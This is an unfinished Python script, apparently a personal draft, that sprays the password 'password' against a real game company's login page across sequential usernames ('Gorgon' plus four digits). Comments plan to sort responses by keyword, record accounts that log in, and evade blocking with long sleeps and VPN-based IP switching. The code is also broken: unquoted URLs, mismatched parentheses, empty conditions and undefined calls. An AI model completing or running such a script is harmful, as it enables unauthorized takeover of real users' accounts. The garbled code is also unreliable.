import requests
from bs4 import BeautifulSoup as bs
import os
import string
import time

url = https://login.webzen.com/

digits = list(range(1000, 9999,1))

for end_digits in digits:

	username = "Gorgon" + end_digits
	password = "password"
## send data, do not allow redirect, just compare keyword
## will it need to refresh page when fail???????
	requests.post(url, allow_redirects=False, data={
		'username': username,
		'current-password': password       
	}
    ## fix to get specific keyword
    age16 = s.get("https://www.webzen.com/")
    upgrade = sget(https://www.webzen.com/)
    success = sget(https://www.webzen.com/)

    if (): # keyword #1
        ##add username to list #1
    elif (): #keyword #2
        ##add username to list #2
    else: ## success!
        ## stop, record username
        
    
    time.sleep(600) # wait for 10 minutes
    
    )

## test username and password sequence
	print 'sending username %s and password %s' % (username, password)
    
## expressvpn auto ip switch : https://github.com/philipperemy/expressvpn-python ???